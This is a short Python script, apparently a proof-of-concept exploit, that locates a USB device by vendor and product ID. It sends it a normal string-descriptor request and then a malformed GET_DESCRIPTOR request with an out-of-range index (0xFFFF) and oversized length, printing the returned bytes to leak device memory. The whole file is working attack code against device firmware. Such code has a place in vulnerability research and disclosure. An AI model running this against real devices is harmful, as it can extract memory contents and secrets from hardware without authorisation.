import usb.core
import argparse


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
        self.args = parser.parse_args()

    def run(self):
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
        if self.dev is None:
            raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))

        print("First: {}".format(bytearray(self.dev.ctrl_transfer(0x80, 0x06, 0x0303, 0x00, 32)).hex()))
        print("Second: {}".format(bytearray(self.dev.ctrl_transfer(0x80, 0x06, 0xFFFF, 0x00, 0xF00)).hex()))


def main():
    e = Exploit()
    e.run()


if __name__ == "__main__":
    main()
